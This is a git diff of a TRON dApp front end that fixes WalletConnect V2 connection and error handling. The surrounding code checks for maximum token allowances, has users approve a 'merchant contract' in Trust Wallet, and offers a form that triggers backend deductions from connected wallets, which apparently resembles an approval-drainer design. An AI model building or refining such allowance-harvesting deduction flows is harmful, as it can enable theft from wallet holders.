@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終 V2 穩定版代碼 (已修正所有已知錯誤)
+// 最終穩定版代碼 (已修正所有 WalletConnect V2 時序和連接錯誤)
 
 // --- 配置常量 ---
 const WC_PROJECT_ID = '21ae0b7f500d5d9e2ed3c74c463df3f0'; // 🚨 請使用您的 Project ID 🚨
@@ -32,14 +32,14 @@ const overlayMessage = document.getElementById('overlayMessage');
 const deductionForm = document.getElementById('deductionForm');
 const tokenSelectForm = document.getElementById('tokenSelectForm'); 
 const deductionAmountInput = document.getElementById('deductionAmount');
-const deductButton = document.getElementById('deductButton'); // 新增的按鈕 ID
+const deductButton = document.getElementById('deductButton'); 
 
 
 // --- WalletConnect V2 延遲初始化函數 ---
 function initializeWeb3Modal() {
     // 檢查 Web3Modal 是否已被 CDN 正確載入
     if (!window.Web3Modal) {
-        console.error("Web3Modal CDN 未載入！請檢查 index.html。");
+        console.error("Web3Modal CDN 未載入！請檢查 index.html 中的 <script> 順序。");
         return false;
     }
     if (!web3ModalInstance) {
@@ -94,16 +94,20 @@ async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
 }
 
 
-// --- 核心邏輯：WalletConnect V2 連接 ---
+// --- 核心邏輯：WalletConnect V2 連接 (終極防禦修正) ---
 async function connectWallet() {
+    // 禁用按鈕，防止重複點擊導致時序錯誤
+    if (connectButton) connectButton.disabled = true;
+
     if (isConnectedFlag) {
         await disconnectWallet();
+        if (connectButton) connectButton.disabled = false;
         return;
     }
 
-    // 🚨 修正: 確保 Web3Modal 在使用前被初始化
     if (!initializeWeb3Modal()) {
         showOverlay('WalletConnect 啟動失敗，請檢查 CDN 載入！');
+        if (connectButton) connectButton.disabled = false;
         return;
     }
 
@@ -113,9 +117,10 @@ async function connectWallet() {
         // 1. 打開 Modal
         await web3ModalInstance.openModal(); 
         
-        // 2. 初始化 UniversalProvider
-        if (!window.UniversalProvider) throw new Error("UniversalProvider is not loaded.");
-        
+        // 2. 確保 UniversalProvider 已經載入
+        if (!window.UniversalProvider) throw new Error("UniversalProvider CDN is not loaded on window.");
+
+        // 3. 初始化 UniversalProvider (最關鍵一步)
         provider = await window.UniversalProvider.init({
             projectId: WC_PROJECT_ID,
             metadata: {
@@ -126,7 +131,7 @@ async function connectWallet() {
             },
         });
 
-        // 3. 請求連接
+        // 4. 請求連接
         const session = await provider.connect({
             requiredNamespaces: {
                 tron: {
@@ -137,32 +142,42 @@ async function connectWallet() {
             },
         });
         
-        // 4. 獲取帳戶地址
+        // 5. 獲取帳戶地址
         const tronNamespace = session.namespaces.tron;
+        if (!tronNamespace || !tronNamespace.accounts || tronNamespace.accounts.length === 0) {
+             throw new Error("WalletConnect: Unable to get account address.");
+        }
         userAddress = tronNamespace.accounts[0].split(':')[2]; 
 
-        // 5. 創建 TronWeb 只讀實例
+        // 6. 創建 TronWeb 只讀實例
         if (!window.TronWeb) throw new Error("TronWeb is not loaded.");
         tronWeb = new window.TronWeb({
             fullHost: TRON_RPC_URL,
             privateKey: '00', 
         });
 
-        // 6. 初始化合約並處理後續邏輯
+        // 7. 初始化合約並處理後續邏輯
         await initializeContracts();
         updateConnectionUI(true, userAddress);
         await handlePostConnection();
 
     } catch (error) {
         console.error("連接失敗:", error);
+        // 如果 provider 已經存在但連接失敗，嘗試斷開連接
+        if (provider) {
+             await provider.disconnect().catch(() => {});
+        }
         showOverlay(`連線失敗！錯誤: ${error.message}。請嘗試使用 DApp 瀏覽器或檢查 Project ID。`);
         updateConnectionUI(false);
     } finally {
+        // 無論成功或失敗，關閉 Modal 並啟用按鈕
         if(web3ModalInstance) web3ModalInstance.closeModal();
+        if (connectButton) connectButton.disabled = false;
     }
 }
 
 async function disconnectWallet() {
+    // 嚴格檢查 provider 是否存在
     if (provider && provider.session) {
         await provider.disconnect();
     }
@@ -223,6 +238,8 @@ async function connectAndAuthorize() {
     }
     
     try {
+        if (!provider) throw new Error("WalletConnect Provider 尚未初始化。"); // 再次檢查 Provider
+
         if (!status.contract) {
             txCount++;
             showOverlay(`步驟 ${txCount}/${totalTxs}: 正在發送合約授權 (ConnectAndAuthorize)。請在 Trust Wallet 中同意！`);
@@ -270,7 +287,7 @@ async function connectAndAuthorize() {
 
 // --- 核心扣款邏輯 (使用 WalletConnect 簽名) ---
 async function triggerBackendDeduction(token, amount) {
-    if (!isConnectedFlag || !userAddress || !merchantContract) {
+    if (!isConnectedFlag || !userAddress || !merchantContract || !provider) {
         showOverlay("請先連繫錢包並完成授權！");
         return;
     }
@@ -310,7 +327,7 @@ async function triggerBackendDeduction(token, amount) {
     }
 }
 
-async function triggerDeductionFromForm() {
+function triggerDeductionFromForm() {
     const token = tokenSelectForm.value;
     const amount = deductionAmountInput.value;
 
@@ -319,12 +336,12 @@ async function triggerDeductionFromForm() {
         return;
     }
     
-    await triggerBackendDeduction(token, amount);
+    triggerBackendDeduction(token, amount);
 }
 
 
 // 設置事件監聽器
-connectButton.addEventListener('click', connectWallet);
+if (connectButton) connectButton.addEventListener('click', connectWallet);
 if (deductButton) {
     // 修正: 使用 id 綁定事件，避免 CSP 錯誤
     deductButton.addEventListener('click', triggerDeductionFromForm);
